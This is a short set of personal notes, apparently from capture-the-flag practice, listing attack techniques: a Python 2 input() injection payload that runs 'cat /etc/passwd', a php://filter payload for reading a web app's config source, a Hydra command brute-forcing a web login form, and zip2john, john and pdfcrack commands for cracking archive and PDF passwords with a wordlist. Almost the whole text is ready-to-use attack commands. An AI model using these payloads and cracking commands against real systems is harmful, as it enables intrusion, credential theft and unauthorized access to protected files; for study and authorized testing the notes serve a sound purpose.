## Learnings:
input() in python2 is not safe, equivalent to eval() 

exploiting input() command: 

```__import__("os").system('cat /etc/passwd')```


##  PHP:
fetching source files : 

index.php?file=php://filter/convert.base64-encode/resource=config 

## Hydra:
hydra -s 45885 -l admin www.bruteforce.me -P rockyou.txt http-form-post "/:password=^PASS^:F=Invalid"

"/login.php:user=^USER^&pass=^PASS^:S=successful"  from docs.

follow the format ' path : inputs : F=failure condition'   , -s specifies port , even if u send pass only, specify user for it to run smoothly


## Zip2John
zip2john zipfile.zip > passwordhash

john --format=pkzip passwordhash  ( depends on the format of archive/hash, look at previous output )

## PDFCrack
pdfcrack -f locked.pdf -w rockyou.txt
